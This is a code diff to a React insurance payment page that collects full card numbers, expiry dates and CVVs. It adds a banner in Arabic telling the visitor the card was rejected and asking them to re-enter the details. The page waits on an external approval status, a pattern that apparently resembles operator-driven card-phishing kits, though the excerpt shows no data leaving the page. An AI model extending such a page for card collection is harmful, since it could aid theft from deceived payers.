@@ -15,6 +15,7 @@ import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import cashbackPromoImg from "@/assets/cashback-promo.png";
 
 const fmt = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
@@ -54,6 +55,7 @@ const InsurancePayment = () => {
 
   const [loading, setLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(null);
   const [cardForm, setCardForm] = useState({ number: "", name: "", expiryMonth: "", expiryYear: "", cvv: "" });
   const [showCvv, setShowCvv] = useState(false);
@@ -151,6 +153,7 @@ const InsurancePayment = () => {
       toast.error(p.paymentRejected);
       setWaitingApproval(false);
       setLoading(false);
+      setRejected(true);
     }
   }, [approvalStatus, orderId, navigate, offer, cardForm.name, cardForm.number, cardForm.expiryMonth, cardForm.expiryYear]);
 
@@ -338,6 +341,12 @@ const InsurancePayment = () => {
                       <WaitingApprovalView p={p} />
                     ) : (
                       <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-5">
+                        <RejectionBanner
+                          show={rejected}
+                          title="تم رفض عملية الدفع"
+                          message="معلومات البطاقة المُدخلة غير صحيحة أو لم تتمكن من التحقق من العملية. يرجى مراجعة رقم البطاقة وتاريخ الانتهاء ورمز الأمان وإعادة المحاولة."
+                          onDismiss={() => setRejected(false)}
+                        />
                         {/* Card Number */}
                         <PaymentInput
                           label={p.cardNumber}
